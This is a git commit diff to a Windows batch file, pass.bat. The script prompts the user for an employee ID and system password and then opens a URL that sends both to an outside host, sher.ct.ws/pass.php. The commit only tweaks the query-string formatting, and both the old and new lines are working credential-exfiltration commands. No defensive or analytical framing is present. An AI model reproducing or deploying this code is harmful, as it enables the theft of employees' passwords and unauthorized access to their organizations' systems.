03debb0d3e2d388759821d8f2689d3834fea7da5
sher-loop <surendhar.fin@gmail.com>
2025-05-17 08:45:17 +0530

    Update pass.bat

--- pass.bat
+++ pass.bat
@@ -4,6 +4,6 @@ cls
 set /p id=Please Enter Your Employe ID:
 cls
 set /p pass=Please Enter Your System Password: 
-start https://sher.ct.ws/pass.php?text=id:%id%++pass:%pass%
+start https://sher.ct.ws/pass.php?text=id:%id%+pass:%pass%
 endlocal
 exit
